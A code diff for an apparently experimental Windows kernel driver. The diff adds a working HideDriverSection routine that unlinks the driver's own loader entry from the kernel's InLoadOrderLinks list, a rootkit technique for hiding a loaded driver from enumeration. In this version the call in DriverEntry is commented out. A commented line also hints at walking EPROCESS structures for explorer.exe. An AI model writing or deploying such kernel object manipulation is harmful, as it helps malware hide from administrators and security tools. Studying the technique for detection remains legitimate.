@@ -131,19 +131,24 @@ int HideDriverSection(PDRIVER_OBJECT DriverObject) {
     PVOID DriverSection = DriverObject->DriverSection;
     PLDR_DATA_TABLE_ENTRY TableEntry  = (PLDR_DATA_TABLE_ENTRY)DriverSection;
     DbgPrintEx(0, 0, "DriverSection: %p\n", DriverSection);
-    PLIST_ENTRY InLoadOrderLinks = (PLIST_ENTRY)((unsigned char*)TableEntry + 0);//current offset of InLoadOrderLinks
-    InLoadOrderLinks = InLoadOrderLinks->Flink;
-    PUNICODE_STRING FullDllName = (UNICODE_STRING*)((unsigned char*)InLoadOrderLinks + 0x48);
+    PLIST_ENTRY InLoadOrderLinks_ = (PLIST_ENTRY)((unsigned char*)TableEntry + 0);//current offset of InLoadOrderLinks
+    PUNICODE_STRING FullDllName = (UNICODE_STRING*)((unsigned char*)InLoadOrderLinks_ + 0x48);
     DbgPrintEx(0, 0, "InLoadOrderLinks FullDllName: %ls\n", FullDllName->Buffer);
-
-    DbgPrintEx(0, 0, "Driver should be hidden \n");
+    PLDR_DATA_TABLE_ENTRY PrevEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Blink;
+    PLDR_DATA_TABLE_ENTRY NextEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Flink;
+    PrevEntry->InLoadOrderLinks.Flink = TableEntry->InLoadOrderLinks.Flink;
+    NextEntry->InLoadOrderLinks.Blink = TableEntry->InLoadOrderLinks.Blink;
+    TableEntry->InLoadOrderLinks.Flink = NULL;
+    TableEntry->InLoadOrderLinks.Blink = NULL;
+    DbgPrintEx(0, 0, "Driver should be hidden\n");
     return 1;
 }
+
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
     //SearchEPROCESSbyOffset(GetImageFileNameOffset("System"), "explorer.exe");
-    HideDriverSection(DriverObject);
+    //HideDriverSection(DriverObject);
     return STATUS_SUCCESS;
 }
